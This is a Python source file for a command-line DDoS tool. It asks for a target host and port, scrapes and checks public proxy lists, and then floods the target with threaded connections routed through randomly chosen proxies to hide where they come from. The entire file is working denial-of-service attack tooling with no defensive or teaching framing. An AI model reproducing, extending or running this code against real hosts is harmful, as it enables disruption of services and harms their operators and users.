import socks, sys, random, threading, os, time, socket, subprocess
import requests
from colorama import Fore


class DDOS():
    def __init__(self):
        subprocess.call('clear', shell=True)
        print(f"""{Fore.CYAN}
▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
   ░       ░        ░ ░        ░  
 ░       ░                        

""")

        self.target = input(f'{Fore.BLUE}[CONSOLE] Please enter target without (http/https): ')
        self.PORT = int(input(f"{Fore.BLUE}[CONSOLE] Please enter target's port: "))
        self.thr = int(input(f"{Fore.BLUE}[CONSOLE] Please enter threads number: "))
        self.ms = int(input(f"{Fore.BLUE}[CONSOLE] Please enter timeout (5-50): "))
        self.proxy_type = input(f'{Fore.BLUE}[CONSOLE] Please enter proxy type (http/socks4/socks5): ')
        self.get_proxy = input(f'{Fore.BLUE}[CONSOLE] Do you want me to scrape proxies for you? (y/n): ')
        if self.get_proxy == "y":
            try:
                os.remove("DDOS/proxylist.txt")
                os.remove("DDOS/good_proxies.txt")
            except:
                pass
            proxylist = open('DDOS/proxylist1.txt', 'a+')
            try:
                r1 = requests.get(f'https://api.proxyscrape.com?request=getproxies&proxytype={self.proxy_type}')
                proxylist.write(r1.text)
            except:
                pass
            try:
                r3 = requests.get(f"https://www.proxyscan.io/download?type={self.proxy_type}")
                proxylist.write(r3.text)
            except:
                pass
            try:
                r4 = requests.get(f"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/{self.proxy_type}.txt")
                proxylist.write(r4.text)
            except:
                pass
            proxylist.close()

            try:
                lines_seen = set()
                outfile = open('DDOS/proxylist.txt', "a+")
                for line in open(f'DDOS/proxylist1.txt', "r"):
                    if line not in lines_seen:
                        outfile.write(line)
                        lines_seen.add(line)
                outfile.close()
                self.proxy_file = 'DDOS/proxylist'
                
                time.sleep(0.1)
                os.remove('DDOS/proxylist1.txt')

            except FileNotFoundError:
                print(f'{Fore.RED}[CONSOLE] I did not find any proxies!')

            except:
                pass
        elif self.get_proxy == "n":
            self.proxy_file = input(f'{Fore.BLUE}[CONSOLE] Please enter proxy filename without .txt extention: ')
            
        self.check_proxy = input(f'{Fore.BLUE}[CONSOLE] Do you want me to check the proxies too?: ')

        self.target = socket.gethostbyname(self.target)

        self.ips = []
        self.ports = []

        self.good = 0
        self.p_checked = 0
        self.good_p = 0



    def ddos(self, ip, port):
        if self.proxy_type == 'http':
            try:
                s = socks.socksocket()

                s.set_proxy(socks.HTTP, str(ip), int(port))

                s.connect((f"{self.target}", self.PORT))

                s.settimeout(self.ms)

                self.good += 1
                
            except FileNotFoundError:
                subprocess.call('clear', shell=True)
                print(f'{Fore.RED}[CONSOLE] Proxy file not found! ')
                sys.exit()
                
            except:
                pass

        elif self.proxy_type == 'socks4':
            try:
                s = socks.socksocket()

                s.set_proxy(socks.SOCKS4, str(ip), int(port))

                s.connect((f"{self.target}", self.PORT))

                s.settimeout(self.ms)

                self.good += 1
                
            except FileNotFoundError:
                subprocess.call('clear', shell=True)
                print(f'{Fore.RED}[CONSOLE] Proxy file not found! ')
                sys.exit()
                
            except:
                pass
        
        elif self.proxy_type == 'socks5':
            try:
                s = socks.socksocket()

                s.set_proxy(socks.SOCKS5, str(ip), int(port))

                s.connect((f"{self.target}", self.PORT))

                s.settimeout(self.ms)

                self.good += 1
                
            except FileNotFoundError:
                subprocess.call('clear', shell=True)
                print(f'{Fore.RED}[CONSOLE] Proxy file not found! ')
                sys.exit()
                
            except:
                pass


    def proxy_checker(self, proxy):
        headers = {'User-Agent': ''}
        user_agent_list = [
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
            'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
            'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10',
            'Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299',
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000',
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", 
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)", 
            "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", 
            "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)", 
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)", 
            "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)", 
            "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)", 
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)", 
            "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6", 
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1", 
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0", 
            "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5", 
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6", 
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11", 
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20", 
            "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
        ]
        headers['User-Agent'] = random.choice(user_agent_list)

        url = 'https://www.google.com'
        F = open(f'DDOS/good_proxies.txt', 'a+', encoding="utf-8", errors='ignore')

        if self.proxy_type == 'http':
            try:
                req = requests.get(url, headers=headers, proxies={'https': f'https://{proxy}', 'http': f'http://{proxy}'}, timeout=self.ms)
                if req.ok:
                    self.good_p += 1
                    F.write(proxy)
                    F.close()
            
                else:
                    pass

            except FileNotFoundError:
                subprocess.call('clear', shell=True)
                print(f'{Fore.RED}[CONSOLE] Proxy file not found! ')
                sys.exit()
                
            except:
                pass

        else:
            try:
                req = requests.get(url, headers=headers, proxies={'https': f'{self.proxy_type}://{proxy}', 'http': f'{self.proxy_type}://{proxy}'}, timeout=self.ms)
                if req.ok:
                    self.good_p += 1
                    F.write(proxy)
                    F.close()
            
                else:
                    pass

            except FileNotFoundError:
                subprocess.call('clear', shell=True)
                print(f'{Fore.RED}[CONSOLE] Proxy file not found! ')
                sys.exit()

            except:
                pass


    def load_proxies(self):
        try:
            with open(f"{self.proxy_file}.txt", 'r+', encoding="utf-8", errors='ignore') as f:
                for p in f.readlines():
                    try:
                        ip1, port1 = p.split(":")[0].replace('\n', ''), p.split(":")[1].replace('\n', '')
                        self.ips.append(ip1)
                        self.ports.append(port1)
                    except:
                        pass
            f.close()

        except FileNotFoundError:
            subprocess.call('clear', shell=True)
            print(f'{Fore.RED}[CONSOLE] Proxy file not found! ')
            sys.exit()


    def start_proxy_checker(self):
        subprocess.call('clear', shell=True)
        try:
            with open(f"{self.proxy_file}.txt", "r+") as f:
                threads = []
                lines = f.readlines()
                for p in lines:
                    if self.p_checked < len(lines):
                        self.p_checked += 1
                        t = threading.Thread(target=self.proxy_checker, args=(p,))
                        t.start()
                        threads.append(t)
                        time.sleep(0.01)
                        sys.stdout.write(f"{Fore.BLUE}[CONSOLE] Checked {self.p_checked} proxies and found {self.good_p} good proxies\r")
                        sys.stdout.flush()

                subprocess.call('clear', shell=True)
                for t in threads:
                    t.join()
                    sys.stdout.write(f"\r{Fore.RED}[CONSOLE] Done! Closing proxy threads... It may take some time")
                    sys.stdout.flush()

            
        except FileNotFoundError:
            print(f'{Fore.RED}[CONSOLE] Proxy file not found!')
            sys.exit()

        except KeyboardInterrupt:
            subprocess.call('clear', shell=True)
            print ("Exitting as you wish... It may take some time")
            sys.exit()


    def start_ddos(self):
        self.load_proxies()
        try:
            f = open(f'{self.proxy_file}.txt', 'r')
            L = int(len(f.readlines()))
            while 1:
                if threading.active_count() < int(self.thr):
                    i = random.randint(0, L-1)
                    threading.Thread(target=self.ddos, args=(self.ips[i], self.ports[i],)).start()
                    sys.stdout.write(f"{Fore.YELLOW}[CONSOLE] Successfull requests: {self.good}\r")
                    sys.stdout.flush()

        except FileNotFoundError:
            subprocess.call('clear', shell=True)
            print(f'{Fore.RED}[CONSOLE] Proxy file not found! ')
            sys.exit()
        
        except KeyboardInterrupt:
            subprocess.call('clear', shell=True)
            print (f"{Fore.RED}[CONSOLE] Exitting as you wish... It may take some time")
            sys.exit()


    def start_all(self):
        if self.check_proxy == 'y':

            subprocess.call('clear', shell=True)
            print(f"{Fore.BLUE}[CONSOLE] Starting proxy checker...")
            time.sleep(1.5)

            subprocess.call('clear', shell=True)
            self.start_proxy_checker()

            subprocess.call('clear', shell=True)
            print(f"{Fore.BLUE}[CONSOLE] Starting attack...")
            if self.check_proxy == 'y':
                self.proxy_file = 'DDOS/good_proxies'
            time.sleep(1)
            
            subprocess.call('clear', shell=True)
            self.start_ddos()

        elif self.check_proxy == 'n':
            self.start_ddos()
